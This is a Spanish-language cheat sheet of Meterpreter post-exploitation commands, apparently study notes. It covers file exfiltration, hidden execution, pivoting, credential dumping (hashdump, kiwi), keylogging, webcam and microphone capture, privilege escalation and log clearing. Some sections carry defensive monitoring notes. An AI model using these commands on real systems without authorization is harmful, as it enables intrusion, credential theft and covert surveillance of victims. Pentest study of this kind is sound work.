tags: 
_____
## Comandos básicos (sesión / control)

- `background` — enviar la sesión a background en msfconsole (retornar al prompt de Metasploit sin cerrar la sesión).
- `exit` — terminar la sesión Meterpreter.
- `sleep <segundos>` — suspender la ejecución del payload por el tiempo indicado.
- `migrate <pid>` — mover el payload a otro proceso (pid). Útil para estabilidad.
- `getpid` — muestra PID del proceso actual donde está inyectado Meterpreter.
- `getuid` — muestra el usuario efectivo en la máquina objetivo.
- `sysinfo` — muestra información del sistema remoto (OS, arquitectura, hostname).

---
## Navegación de archivos y transferencia

- `pwd` — muestra directorio actual.
- `ls` — listar ficheros (acepta patrones).
- `cd <ruta>` — cambiar directorio.
- `download <remoto> [local]` — descargar archivo remoto al host atacante (por defecto guarda en directorio de trabajo del msf).
- `upload <local> <remoto>` — subir archivo desde tu máquina al objetivo.
- `rm <archivo>` — borrar un archivo remoto.
- `edit <archivo>` — editar (lanzará un editor desde tu entorno Metasploit si está habilitado).

> **Nota:** muchas implementaciones devuelven ayuda contextual: `help download` te da flags concretos en tu versión.

---
## Ejecución de procesos / shells

- `execute -f <binary> [-a "<args>"] [-i] [-t] [-H]` — ejecutar un binario en el host remoto. Parámetros comunes:
    
    - `-f <file>`: archivo a ejecutar.
    - `-a "<args>"`: argumentos.
    - `-i` : ejecutar interactivo (redirige IO).
    - `-t` : crear una nueva tty (si aplica).
    - `-H` : ejecutar de forma oculta (flag disponible según plataforma/version).
- `shell` — abrir una shell interactiva simple (drop to command shell)
- `execute -c` — ejecutar comando y cerrar (varía por versión)

_(Consulta `help execute` en tu sesión para ver exactamente los flags de tu build.)_

---
## Redes / tunelización / reenvío

- `portfwd add -l <LPORT> -p <RPORT> -r <RHOST>` — agregar forward local: escucha en tu máquina y reenvía hacia RHOST:RPORT desde la sesión.
    
    - `-l` puerto local, `-p` puerto remoto, `-r` host remoto (desde la vista del contexto del objetivo).
        
- `portfwd list` / `portfwd delete` — listar / borrar reenvíos.
- `socks` / `socks4a` (si disponible) — levantar proxy SOCKS a través de la sesión (depende de extensiones y configuración en msf).
- `route add <subnet> <mask> <session-id>` — añadir ruta para pivoting (se gestiona desde msfconsole, no solo meterpreter).

---
## Captura de credenciales y autenticación (extensiones)

- `keyscan_start` / `keyscan_dump` / `keyscan_stop` — iniciar/capturar/parar keylogging (te devuelve teclas capturadas).
- `hashdump` — volcar hashes de SAM en sistemas Windows (requiere privilegios y la extensión apropiada).
- `kiwi` (extension) — comandos avanzados para credenciales/LSA (similar a mimikatz; aparece como `load kiwi`, `kiwi_command` en algunas builds).

> **Defensa**: estos comandos son indicadores fuertes de un compromiso. Monitorizar acceso a lsass, llamadas a servicios de credenciales y procesos inusuales.

---
## Captura de pantalla / cámara / audio

- `screenshot` — tomar captura de pantalla del host.
- `webcam_list` / `webcam_snap` / `webcam_stream` — listar cámaras y tomar snapshots/stream (si la extensión y permisos lo permiten).
- `record_mic` / `play_mic` — grabación de audio (opciones varían por versión y extensiones).

---
## Interacción con procesos y memoria

- `ps` — listar procesos en la máquina víctima.
- `kill <pid>` — matar proceso.
- `getpid` — ver el pid actual (donde está inyectado meterpreter).
- `migrate <pid>` — moverse a otro proceso (ver arriba).
- `mem_dump` / `dump_process` (según extensión) — volcar memoria de un proceso (uso avanzado, depende de privilegios).

---
## Privilegios / escalada (extensiones disponibles)

- `getprivs` — listar privilegios actuales (Windows).
- `enable_priv` / `getprivs` — dependiendo de extensiones, intentar obtener privilegios (requiere módulos y permisos).
- `load priv` — cargar extensión `priv` para funciones elevadas (si disponible).

> **Aviso de seguridad**: estas funciones son las que más claramente indican una intrusión. Desde defensa, monitorea peticiones inusuales a APIs de elevación y creación de servicios.

---
## Automatización / scripts

- `run <post/script>` — ejecutar scripts/metasploit scripts integrados dentro de la sesión (por ejemplo post módulos que se pueden ejecutar vía meterpreter).
- `resource`/`run` desde msfconsole para automatizar pasos que incluyan meterpreter.
- `meterpreter` puede ejecutar scripts Ruby/RC a través del framework (ver `run post/...`).

---
## Logs, persistencia y limpieza (defensa)

- **Logs**: meterpreter deja señales en tráfico de red (conexiones reverse), procesos extraños y uso de cuentas.
- **Persistencia**: meterpreter no _necesita_ persistencia, pero herramientas asociadas lo automatizan — desde defensa, monitoriza creaciones de servicios, tareas programadas y cambios en `autorun`/startups.
- **Limpieza**: comandos como `clearev` (en algunas versiones) intentan borrar logs de evento; su uso es altamente indicativo de intento de encubrimiento.

## Sniffer
____
